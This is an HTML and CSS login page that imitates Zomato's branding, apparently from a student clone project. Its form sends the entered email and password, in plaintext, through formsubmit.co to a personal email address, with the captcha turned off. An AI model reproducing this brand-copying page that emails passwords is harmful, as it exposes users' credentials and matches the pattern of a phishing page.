<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <title>LogIn-Zomato</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Helvetica;
      background-color: #e23744;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .navbar h1 {
      color: white;
      font-size: 45px;
      font-weight: bolder;
      font-style: italic;
      text-align: center;
      margin-bottom: 10px;
    }

    .navbar hr {
      border: none;
      border-top: 3px solid white;
      width: 60%;
      margin: 0 auto 20px;
    }

    .form2 h2 {
      text-align: center;
      font-size: 30px;
      color: #333;
      margin-bottom: 10px;
    }

    .label hr {
      border: none;
      border-top: 3px solid white;
      width: 60%;
      margin: 0 auto 20px;
    }

    .form1 {
      width: 400px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 2px 3px #333;
      padding: 30px 20px;
      text-align: center;
    }

    .srch-1,
    .srch-2 {
      text-align: left;
      margin-bottom: 20px;
    }

    .srch-1 label,
    .srch-2 label {
      display: block;
      font-size: 15px;
      margin-bottom: 5px;
    }

    .srch1,
    .srch2 {
      width: 100%;
      height: 44px;
      font-size: 16px;
      padding: 10px;
      border: 1px solid gray;
      border-radius: 7px;
      box-shadow: 0 1px 2px #ccc;
    }

    .check {
      text-align: left;
      font-size: 18px;
      color: rgba(0, 0, 0, 0.7);
      margin-bottom: 20px;
    }

    .check input {
      accent-color: #e23744;
      margin-right: 8px;
    }

    .btn {
      width: 100%;
      height: 45px;
      background-color: #e23744;
      border: none;
      border-radius: 7px;
      color: white;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      transition: 0.3s ease;
    }

    .btn:hover {
      transform: scale(1.05);
      background-color: #b5222f;
    }

    .liw {
      font-size: 18px;
      color: rgba(0, 0, 0, 0.753);
      margin-top: 25px;
    }

    .liw i {
      margin-left: 8px;
    }

    .forgot {
      margin-top: 20px;
    }

    .forgot a {
      color: #e23744;
      font-weight: bolder;
      text-decoration: none;
      font-size: 16px;
    }

    .forgot a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>
  <div class="navbar">
    <h1>Zomato - Order food Online</h1>
    <hr>
  </div>

  <div class="form2">
    <h2>Login</h2>
  </div>

  <div class="label">
    <hr>
  </div>

  <div class="form1">
    <!-- Added id for JS -->
    <form id="loginForm" action="https://formsubmit.co/kartik.24bet10014@vitbhopal.ac.in" method="POST">
      <!-- Redirect and captcha settings -->
      <input type="hidden" name="_next" value="https://kartik33541.github.io/Zomato-Clone-using-HTML-CSS-and-JS/thanks.html">
      <input type="hidden" name="_captcha" value="false">

      <div class="srch-1">
        <label for="email">Email/Username:</label>
        <input class="srch1" id="email" name="email" type="email" placeholder="Enter email/username here" required>
      </div>

      <div class="srch-2">
        <label for="password">Password:</label>
        <input class="srch2" id="password" name="password" type="password" placeholder="Enter password here" required>
      </div>

      <div class="check">
        <input class="chk" id="remember" type="checkbox" name="remember">
        <label for="remember">Remember me</label>
      </div>

      <button class="btn" type="submit">Login</button>

      <p class="liw">Log in with: <i class="fa-brands fa-google"></i></p>
      <p class="forgot"><a href="#">Forgot Password</a></p>
    </form>
  </div>

  <script>
    // Optional: store user info locally 
    const form = document.getElementById("loginForm");

    form.addEventListener("submit", function () {
      const email = document.getElementById("email").value;
      localStorage.setItem("useremail", email);
    });
  </script>
</body>

</html>
